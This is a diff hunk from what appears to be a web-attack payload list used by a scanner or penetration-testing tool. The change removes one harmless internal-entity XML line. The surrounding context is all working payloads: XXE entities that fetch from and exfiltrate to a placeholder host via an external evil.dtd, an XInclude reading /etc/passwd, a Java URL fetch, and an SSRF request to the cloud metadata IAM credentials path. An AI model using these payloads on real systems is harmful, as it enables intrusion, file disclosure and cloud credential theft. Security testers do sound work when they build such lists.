@@ -97,7 +97,6 @@ new java.net.URL('http://{domain}/javaeval').openStream()
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{domain}/xxe">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://{domain}/evil.dtd">%dtd;%payload;]><foo>&exfil;</foo>
 <xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY a "1337">]><foo>&a;</foo>
 
 ##POLYGLOT - SSRF##
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
